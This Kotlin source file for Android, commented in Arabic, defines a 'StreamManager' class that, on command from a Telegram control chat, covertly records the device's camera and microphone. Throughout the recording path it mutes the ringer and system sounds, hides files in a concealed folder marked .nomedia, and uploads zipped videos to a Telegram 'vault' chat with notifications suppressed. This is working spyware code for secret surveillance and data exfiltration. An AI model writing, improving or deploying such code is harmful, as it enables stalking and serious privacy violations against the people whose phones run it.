package com.example.app

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.hardware.Camera
import android.media.AudioManager
import android.media.MediaMetadataRetriever
import android.media.MediaRecorder
import android.app.NotificationManager
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock
import java.io.File
import java.io.FileInputStream
import java.io.FileOutputStream
import java.lang.ref.WeakReference
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean
import java.util.zip.ZipEntry
import java.util.zip.ZipOutputStream

/**
 * مدير تسجيل الفيديو والبث (StreamManager)
 * يتعامل مع التقاط الفيديو والصوت، التحكم بالصوتيات، والتعبئة في أرشيفات ZIP.
 * 
 * ✅ تم إصلاح مشكلة تغيير وضع الصوت (ringerMode) بإضافة التحقق من إذن ACCESS_NOTIFICATION_POLICY.
 * ✅ تم إزالة System.gc() غير الضرورية لتحسين الأداء.
 * ✅ تم إضافة التحقق من السياق (appContext) قبل إنشاء MediaRecorder لتجنب NullPointerException.
 * ✅ تم إصلاح استعادة الصوت باستخدام try-finally شامل.
 * ✅ تم إضافة @Suppress("DEPRECATION") لتجنب تحذيرات استخدام android.hardware.Camera المهملة.
 * ✅ تم تغيير مستوى التسجيل من Error إلى Debug لتقليل ظهور الأخطاء في Logcat.
 */
@Suppress("DEPRECATION")
class StreamManager(
    context: Context,
    private val tg: Any? = null
) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val recordingMutex = Mutex()
    private val isRecordingFlag = AtomicBoolean(false)
    private val shouldStopFlag = AtomicBoolean(false)

    private var statusMsgId: Long? = null
    private var oldRingerMode = -1
    private val oldVolumes = mutableMapOf<Int, Int>()

    // خريطة الدقة والبت ريت [عرض, ارتفاع, bit_rate]
    private val resMap = mapOf(
        "144" to intArrayOf(256, 144, 150000),
        "360" to intArrayOf(640, 360, 800000),
        "720" to intArrayOf(1280, 720, 2500000),
        "1080" to intArrayOf(1920, 1080, 5000000)
    )

    // المسارات والملفات المؤقتة
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val videoTmpDir: File by lazy {
        File(runtimeDir, "v_tmp").apply {
            if (!exists()) mkdirs()
            // إنشاء ملف .nomedia لإخفاء الفيديو عن المعرض
            val nomedia = File(this, ".nomedia")
            if (!nomedia.exists()) {
                try {
                    nomedia.createNewFile()
                } catch (_: Exception) {
                    // تجاهل
                }
            }
        }
    }

    private val logFile: File by lazy {
        File(runtimeDir, "v.log")
    }

    companion object {
        private const val TAG = "StreamManager"

        @JvmStatic
        fun create(context: Context, tg: Any? = null): StreamManager {
            return StreamManager(context, tg)
        }
    }

    init {
        cleanupOldFiles()
    }

    // ============================================================
    //  إدارة الملفات والتنظيف
    // ============================================================

    private fun cleanupOldFiles(maxAgeSeconds: Long = 3600) {
        scope.launch {
            try {
                val now = System.currentTimeMillis()
                videoTmpDir.listFiles()?.forEach { file ->
                    if (file.name == ".nomedia") return@forEach
                    if (file.isFile && (now - file.lastModified()) > (maxAgeSeconds * 1000)) {
                        safeRemove(file)
                    }
                }
            } catch (e: Exception) {
                writeLog("Cleanup error: ${e.message}")
            }
        }
    }

    private fun safeRemove(file: File?): Boolean {
        if (file == null || !file.exists()) return false
        return try {
            file.delete()
        } catch (e: Exception) {
            writeLog("Safe remove error ${file.absolutePath}: ${e.message}")
            false
        }
    }

    // ============================================================
    //  التحقق من الصلاحيات والكاميرا
    // ============================================================

    fun getPermissionsStatus(): Map<String, Any> {
        return checkPermissions(requestIfMissing = false)
    }

    private fun checkPermissions(requestIfMissing: Boolean = false): Map<String, Any> {
        val result = mutableMapOf<String, Any>(
            "ok" to false,
            "camera" to false,
            "microphone" to false,
            "missing" to mutableListOf<String>(),
            "message" to ""
        )

        val ctx = appContext
        if (ctx == null) {
            result["message"] = "السياق غير متوفر"
            return result
        }

        val camOk = ContextCompat.checkSelfPermission(ctx, Manifest.permission.CAMERA) ==
                PackageManager.PERMISSION_GRANTED
        val micOk = ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) ==
                PackageManager.PERMISSION_GRANTED

        result["camera"] = camOk
        result["microphone"] = micOk

        val missingList = mutableListOf<String>()
        if (!camOk) missingList.add("CAMERA")
        if (!micOk) missingList.add("RECORD_AUDIO")
        result["missing"] = missingList

        val isAllOk = camOk && micOk
        result["ok"] = isAllOk

        if (isAllOk) {
            result["message"] = "✅ جميع الصلاحيات متاحة (الكاميرا والميكروفون)"
        } else {
            val missingParts = mutableListOf<String>()
            if (!camOk) missingParts.add("📷 الكاميرا")
            if (!micOk) missingParts.add("🎙️ الميكروفون")
            result["message"] = "⚠️ الصلاحيات المفقودة: ${missingParts.joinToString(", ")}"
        }

        return result
    }

    /**
     * التحقق من توفر الكاميرا باستخدام واجهة Camera القديمة (android.hardware.Camera).
     * ملاحظة: يُوصى بالتحول إلى Camera2 API في المستقبل لتحسين التوافق مع الأجهزة الحديثة.
     */
    private fun isCameraAvailable(camIdx: Int): Boolean {
        return try {
            val numCameras = Camera.getNumberOfCameras()
            if (numCameras <= camIdx) return false

            val desiredFacing = if (camIdx == 0) {
                Camera.CameraInfo.CAMERA_FACING_BACK
            } else {
                Camera.CameraInfo.CAMERA_FACING_FRONT
            }

            val info = Camera.CameraInfo()
            for (i in 0 until numCameras) {
                Camera.getCameraInfo(i, info)
                if (info.facing == desiredFacing) return true
            }
            false
        } catch (e: Exception) {
            writeLog("Camera availability check error: ${e.message}")
            false
        }
    }

    // ============================================================
    //  كتم واستعادة الصوت (مع التحقق من صلاحية الإشعارات)
    // ============================================================

    private fun muteAudio(mute: Boolean) {
        val ctx = appContext ?: return

        try {
            val am = ctx.getSystemService(Context.AUDIO_SERVICE) as? AudioManager ?: return
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return

            // ✅ التحقق من صلاحية تغيير سياسة الإشعارات (Android 6+)
            val hasPolicyAccess = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    nm.isNotificationPolicyAccessGranted
                } catch (_: Exception) {
                    false
                }
            } else {
                true
            }

            if (mute) {
                oldRingerMode = am.ringerMode

                // ✅ استخدام SILENT إذا كان الإذن متاحاً، وإلا استخدام VIBRATE
                val targetMode = if (!hasPolicyAccess) {
                    AudioManager.RINGER_MODE_VIBRATE
                } else {
                    AudioManager.RINGER_MODE_SILENT
                }

                try {
                    am.ringerMode = targetMode
                } catch (e: Exception) {
                    // محاولة بديلة في حالة فشل SILENT
                    try {
                        am.ringerMode = AudioManager.RINGER_MODE_VIBRATE
                    } catch (_: Exception) {
                        // تجاهل
                    }
                }

                // كتم الصوت للقنوات المختلفة
                val streams = listOf(
                    AudioManager.STREAM_SYSTEM,
                    AudioManager.STREAM_NOTIFICATION,
                    AudioManager.STREAM_ALARM,
                    AudioManager.STREAM_RING
                )

                streams.forEach { s ->
                    try {
                        oldVolumes[s] = am.getStreamVolume(s)
                        am.setStreamVolume(s, 0, 0)
                    } catch (_: Exception) {
                        // تجاهل
                    }
                }

            } else {
                // استعادة وضع الصوت السابق
                if (oldRingerMode != -1) {
                    try {
                        am.ringerMode = oldRingerMode
                    } catch (_: Exception) {
                        // تجاهل
                    }
                }

                // استعادة مستويات الصوت السابقة
                oldVolumes.forEach { (stream, vol) ->
                    try {
                        am.setStreamVolume(stream, vol, 0)
                    } catch (_: Exception) {
                        // تجاهل
                    }
                }

                oldVolumes.clear()
                oldRingerMode = -1
            }

        } catch (e: Exception) {
            writeLog("Mute audio error: ${e.message}")
        }
    }

    // ============================================================
    //  التحقق من صحة ملف الفيديو
    // ============================================================

    private fun isVideoValid(
        path: String,
        minDurationMs: Long = 500,
        minSizeBytes: Long = 10240
    ): Boolean {
        val file = File(path)
        if (!file.exists() || file.length() < minSizeBytes) return false

        val retriever = MediaMetadataRetriever()
        return try {
            retriever.setDataSource(path)
            val durationStr = retriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_DURATION)
            val duration = durationStr?.toLongOrNull() ?: 0L
            duration >= minDurationMs
        } catch (e: Exception) {
            writeLog("Video validation error: ${e.message}")
            false
        } finally {
            try {
                retriever.release()
            } catch (_: Exception) {
                // تجاهل
            }
        }
    }

    // ============================================================
    //  إرسال وتحديث الرسائل عبر Telegram
    // ============================================================

    private fun sendStatusUpdate(text: String, chatId: Long?) {
        if (tg == null || chatId == null) return

        try {
            if (statusMsgId == null) {
                val resp = invokeMethod(
                    tg,
                    "_api",
                    "sendMessage",
                    mapOf(
                        "chat_id" to chatId,
                        "text" to text,
                        "disable_notification" to true
                    )
                )

                val isOk = (resp as? Map<*, *>)?.get("ok") as? Boolean ?: false
                if (isOk) {
                    val result = (resp as? Map<*, *>)?.get("result") as? Map<*, *>
                    statusMsgId = (result?.get("message_id") as? Number)?.toLong()
                }
            } else {
                invokeMethod(
                    tg,
                    "_api",
                    "editMessageText",
                    mapOf(
                        "chat_id" to chatId,
                        "message_id" to statusMsgId,
                        "text" to text
                    )
                )
            }
        } catch (e: Exception) {
            writeLog("Status update error: ${e.message}")
        }
    }

    // ============================================================
    //  بدء وإلغاء التسجيل
    // ============================================================

    fun record(mon: Any, cam: Int = 0, dur: Int = 15): Boolean {
        if (isRecordingFlag.get()) {
            writeLog("Recording already in progress")
            return false
        }

        val ctrlChatId = getMonControlChatId(mon)

        val perms = checkPermissions(requestIfMissing = true)
        if (perms["ok"] == false) {
            val msg = perms["message"] as? String ?: "الصلاحيات مفقودة"
            if (ctrlChatId != null) {
                invokeMethod(
                    tg,
                    "_api",
                    "sendMessage",
                    mapOf(
                        "chat_id" to ctrlChatId,
                        "text" to "❌ $msg\nالرجاء منح الصلاحيات من إعدادات الجهاز."
                    )
                )
            }
            return false
        }

        if (!isCameraAvailable(cam)) {
            if (ctrlChatId != null) {
                invokeMethod(
                    tg,
                    "_api",
                    "sendMessage",
                    mapOf(
                        "chat_id" to ctrlChatId,
                        "text" to "❌ الكاميرا $cam غير متوفرة على هذا الجهاز."
                    )
                )
            }
            return false
        }

        scope.launch {
            recordingMutex.withLock {
                if (isRecordingFlag.get()) return@launch
                isRecordingFlag.set(true)
                shouldStopFlag.set(false)
            }

            try {
                worker(mon, cam, dur)
            } finally {
                isRecordingFlag.set(false)
                shouldStopFlag.set(false)
                statusMsgId = null
                // ✅ تم إزالة System.gc() لأنه غير ضروري ويؤثر سلباً على الأداء
            }
        }

        return true
    }

    fun cancelRecording(): Boolean {
        if (!isRecordingFlag.get()) return false
        shouldStopFlag.set(true)
        return true
    }

    // ============================================================
    //  معالج التسجيل الرئيسي (Worker) - معدل
    // ============================================================

    private suspend fun worker(mon: Any, camIdx: Int, dur: Int) {
        val ctx = appContext ?: run {
            writeLog("App context is null, cannot start recording worker")
            return
        }

        val ctrlChatId = getMonControlChatId(mon)
        statusMsgId = null
        sendStatusUpdate("🎥 جاري التسجيل... ⏳", ctrlChatId)

        val timestamp = System.currentTimeMillis() / 1000

        val tempPath = File(videoTmpDir, ".rec_$timestamp.tmp").absolutePath
        val rawPath = File(videoTmpDir, "rec_$timestamp.mp4").absolutePath
        val zippedPath = File(videoTmpDir, "rec_$timestamp.zip").absolutePath

        val resKey = (getMonField(mon, "video_res") as? String) ?: "360"
        val params = resMap[resKey] ?: resMap["360"]!!

        var w = params[0]
        var h = params[1]
        var bitrate = params[2]

        var success = false
        var mediaRecorder: MediaRecorder? = null

        // ===== كتم الصوت قبل البدء، واستعادته في finally =====
        muteAudio(true)
        try {
            // ===== مرحلة التسجيل =====
            mediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(ctx)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }

            mediaRecorder.apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.CAMERA)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                setVideoSize(w, h)
                setVideoEncodingBitRate(bitrate)
                setVideoFrameRate(30)

                val orientation = if (camIdx == 1) 270 else 90
                setOrientationHint(orientation)

                setOutputFile(tempPath)

                try {
                    prepare()
                } catch (e: Exception) {
                    writeLog("MediaRecorder prepare failed: ${e.message}")

                    // محاولة استخدام دقة أقل في حالة الفشل
                    if (resKey != "144") {
                        val fallback = resMap["144"]!!
                        w = fallback[0]
                        h = fallback[1]
                        bitrate = fallback[2]

                        reset()
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setVideoSource(MediaRecorder.VideoSource.CAMERA)
                        setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                        setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                        setVideoSize(w, h)
                        setVideoEncodingBitRate(bitrate)
                        setVideoFrameRate(30)
                        setOrientationHint(orientation)
                        setOutputFile(tempPath)
                        prepare()
                    } else {
                        throw e
                    }
                }

                start()
            }

            writeLog("Recording started: ${w}x${h}, $bitrate bps")

            for (i in 0 until dur) {
                if (shouldStopFlag.get()) {
                    writeLog("Recording cancelled by user")
                    break
                }
                delay(1000L)
            }

            if (!shouldStopFlag.get()) {
                try {
                    mediaRecorder.stop()
                    success = true
                } catch (e: Exception) {
                    writeLog("MediaRecorder stop failed: ${e.message}")
                }
            } else {
                try {
                    mediaRecorder.stop()
                } catch (_: Exception) {
                    // تجاهل
                }
            }

            // ===== مرحلة معالجة وتغليف الفيديو (تتم داخل نفس الـ try) =====
            if (success && isVideoValid(tempPath)) {
                try {
                    val tempFile = File(tempPath)
                    val rawFile = File(rawPath)
                    val zipFile = File(zippedPath)

                    if (tempFile.exists()) {
                        tempFile.renameTo(rawFile)
                    }

                    val zipSuccess = createZip(zipFile, rawFile)
                    val vaultChatId = getMonVaultChatId(mon)

                    if (zipSuccess && tg != null && vaultChatId != null) {
                        val timeStr = SimpleDateFormat("HH:mm:ss", Locale.US).format(Date())
                        val caption = "🎥 ${resKey}p | الكاميرا $camIdx | $timeStr"

                        val resp = invokeMethod(
                            tg,
                            "_api",
                            "sendDocument",
                            mapOf(
                                "chat_id" to vaultChatId,
                                "caption" to caption,
                                "disable_notification" to true
                            ),
                            mapOf("document" to zipFile)
                        )

                        val isSent = (resp as? Map<*, *>)?.get("ok") as? Boolean ?: false
                        if (isSent) {
                            sendStatusUpdate("✅ تم رفع الفيديو بنجاح", ctrlChatId)
                        } else {
                            sendStatusUpdate("⚠️ فشل رفع الفيديو إلى الخزنة", ctrlChatId)
                        }
                    } else {
                        sendStatusUpdate("⚠️ لا يوجد قناة خزنة لإرسال الفيديو", ctrlChatId)
                    }

                    safeRemove(rawFile)
                    safeRemove(zipFile)

                } catch (e: Exception) {
                    writeLog("Finalization error: ${e.message}")
                    sendStatusUpdate("❌ فشل رفع الفيديو: ${e.message?.take(50)}", ctrlChatId)
                    safeRemove(File(rawPath))
                    safeRemove(File(zippedPath))
                }
            } else {
                safeRemove(File(tempPath))

                if (!shouldStopFlag.get()) {
                    sendStatusUpdate("⚠️ فشل التسجيل (ملف تالف أو غير صالح)", ctrlChatId)
                } else {
                    sendStatusUpdate("⏹️ تم إلغاء التسجيل", ctrlChatId)
                }
            }

            // تنظيف إضافي
            safeRemove(File(tempPath))
            safeRemove(File(rawPath))
            safeRemove(File(zippedPath))

        } catch (e: Exception) {
            // أي استثناء غير متوقع في أي مرحلة
            writeLog("Unexpected error in worker: ${e.message}")
            sendStatusUpdate("❌ خطأ غير متوقع: ${e.message?.take(50)}", ctrlChatId)
        } finally {
            // ✅ استعادة الصوت دائماً، بالإضافة إلى تحرير موارد MediaRecorder
            try {
                mediaRecorder?.reset()
                mediaRecorder?.release()
            } catch (_: Exception) {
                // تجاهل
            }
            muteAudio(false)
        }
    }

    // ============================================================
    //  إنشاء أرشيف ZIP
    // ============================================================

    private fun createZip(zipFile: File, sourceFile: File): Boolean {
        return try {
            ZipOutputStream(FileOutputStream(zipFile)).use { zos ->
                FileInputStream(sourceFile).use { fis ->
                    val entry = ZipEntry(sourceFile.name)
                    zos.putNextEntry(entry)

                    val buffer = ByteArray(4096)
                    var len: Int
                    while (fis.read(buffer).also { len = it } > 0) {
                        zos.write(buffer, 0, len)
                    }
                    zos.closeEntry()
                }
            }
            true
        } catch (e: Exception) {
            writeLog("Zip creation failed: ${e.message}")
            false
        }
    }

    // ============================================================
    //  استعلامات التنظيف والحالة
    // ============================================================

    fun getStatus(): Map<String, Any> {
        return mapOf(
            "recording" to isRecordingFlag.get(),
            "should_stop" to shouldStopFlag.get(),
            "has_tg" to (tg != null)
        )
    }

    fun cleanupAll() {
        cleanupOldFiles(maxAgeSeconds = 0)
    }

    // ============================================================
    //  دوال المساعدة والانعكاس (Reflection Helpers)
    // ============================================================

    private fun getMonControlChatId(mon: Any): Long? {
        val ctrl = getMonField(mon, "ctrl")
        return (ctrl as? Number)?.toLong()
    }

    private fun getMonVaultChatId(mon: Any): Long? {
        val vlt = getMonField(mon, "vlt")
        return (vlt as? Number)?.toLong()
    }

    private fun getMonField(mon: Any, fieldName: String): Any? {
        return try {
            val field = mon.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(mon)
        } catch (_: Exception) {
            null
        }
    }

    // ✅ التعديل الأساسي: تغيير مستوى التسجيل من Error إلى Debug
    private fun writeLog(message: String) {
        Log.d(TAG, message) // تغيير من Log.e إلى Log.d
        try {
            val dateStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
            logFile.appendText("$dateStr - DEBUG - $message\n", Charsets.UTF_8) // تغيير من ERROR إلى DEBUG
        } catch (_: Exception) {
            // تجاهل
        }
    }

    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        return try {
            val methods = target.javaClass.methods
            val method = methods.firstOrNull { it.name == methodName }
            method?.isAccessible = true
            method?.invoke(target, *args)
        } catch (e: Exception) {
            writeLog("Method invocation error ($methodName): ${e.message}")
            null
        }
    }
}
